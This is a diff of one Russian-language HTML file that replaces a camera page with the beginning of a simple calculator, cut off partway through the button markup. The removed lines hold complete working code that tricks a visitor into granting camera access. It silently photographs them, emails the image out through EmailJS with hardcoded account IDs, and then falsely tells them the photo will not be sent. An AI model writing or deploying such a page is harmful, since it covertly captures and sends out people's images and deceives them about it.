@@ -1,76 +1,89 @@
+Вот простой пример калькулятора на HTML, CSS и JavaScript — всё в одном файле.
+Его можно скопировать и вставить в любой .html файл, затем открыть в браузере.
+
 <!DOCTYPE html>
 <html lang="ru">
 <head>
   <meta charset="UTF-8">
-  <title>Фото с камеры</title>
-  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@2.6.4/dist/email.min.js"></script>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Калькулятор</title>
   <style>
-    body { font-family: sans-serif; background: #f3f3f3; text-align: center; margin-top: 60px; }
-    #agreement, #result { background: white; padding: 20px; border-radius: 10px; width: 340px; margin: 0 auto; box-shadow: 0 0 8px rgba(0,0,0,0.1); }
-    button { background: green; color: white; padding: 10px 20px; font-size: 16px; border: none; border-radius: 6px; cursor: pointer; }
-    #loading { font-size: 18px; color: #333; }
-    video, canvas { display: none; }
+    body {
+      background: #1e1e1e;
+      color: #fff;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      font-family: Arial, sans-serif;
+    }
+
+    .calculator {
+      background: #2c2c2c;
+      padding: 20px;
+      border-radius: 10px;
+      box-shadow: 0 0 10px #000;
+      width: 260px;
+    }
+
+    .display {
+      background: #111;
+      padding: 15px;
+      border-radius: 5px;
+      text-align: right;
+      font-size: 2em;
+      margin-bottom: 15px;
+      overflow-x: auto;
+    }
+
+    .buttons {
+      display: grid;
+      grid-template-columns: repeat(4, 1fr);
+      gap: 10px;
+    }
+
+    button {
+      padding: 20px;
+      font-size: 1.2em;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+      background: #444;
+      color: #fff;
+      transition: 0.2s;
+    }
+
+    button:hover {
+      background: #666;
+    }
+
+    .equal {
+      background: #0078ff;
+    }
+
+    .equal:hover {
+      background: #005fcc;
+    }
+
+    .clear {
+      background: #ff4b4b;
+    }
+
+    .clear:hover {
+      background: #d63b3b;
+    }
   </style>
 </head>
 <body>
-  <div id="agreement">
-    <h2>Соглашение</h2>
-    <p>Нажимая кнопку ниже, вы соглашаетесь с политикой темных стен.</p>
-    <button id="acceptBtn">Разрешить камеру</button>
-  </div>
+  <div class="calculator">
+    <div class="display" id="display">0</div>
+    <div class="buttons">
+      <button class="clear" onclick="clearDisplay()">C</button>
+      <button onclick="appendOperator('/')">÷</button>
+      <button onclick="appendOperator('*')">×</button>
+      <button onclick="deleteLast()">⌫</button>
 
-  <div id="result" style="display:none;">
-    <h2>Спасибо!</h2>
-    <p>Фото не будет отправлено.</p>
-  </div>
-
-  <video id="video" autoplay playsinline width="320" height="240"></video>
-  <canvas id="canvas" width="320" height="240"></canvas>
-
-  <script>
-    // ✅ Инициализация EmailJS
-    emailjs.init("4PEicIHTtAabJqfD1"); // 🔹 вставь сюда свой Public Key
-
-    const acceptBtn = document.getElementById("acceptBtn");
-    const agreement = document.getElementById("agreement");
-    const result = document.getElementById("result");
-    const video = document.getElementById("video");
-    const canvas = document.getElementById("canvas");
-
-    // 🔸 Когда пользователь соглашается
-    acceptBtn.onclick = async function() {
-      agreement.style.display = "none";
-      document.body.insertAdjacentHTML("beforeend", `<p id="loading">Идёт фотографирование...</p>`);
-
-      try {
-        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-        video.srcObject = stream;
-
-        // ждём, чтобы камера включилась
-        await new Promise(resolve => setTimeout(resolve, 1200));
-
-        const ctx = canvas.getContext("2d");
-        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-        stream.getTracks().forEach(track => track.stop());
-
-        // уменьшаем качество, чтобы письмо прошло
-        const photoData = canvas.toDataURL("image/jpeg", 0.4);
-
-        // отправляем на EmailJS
-        await emailjs.send("service_zv13ydk", "template_60nz82p", {
-          time: new Date().toLocaleString(),
-          photo_link: photoData // совпадает с {{photo_link}} в шаблоне
-        });
-
-        console.log("✅ Фото успешно отправлено!");
-        document.getElementById("loading").remove();
-        result.style.display = "block";
-
-      } catch (err) {
-        console.error("Ошибка:", err);
-        alert("Не удалось получить доступ к камере: " + err.message);
-      }
-    };
-  </script>
-</body>
-</html>
+      <button onclick="appendNumber('7')">7</button>
+      <button onclick="appendNumber('8')">8</button>
+      <button onclick="appendNumber('9')">9</button>
+      <button onclick="appendOperator('-')
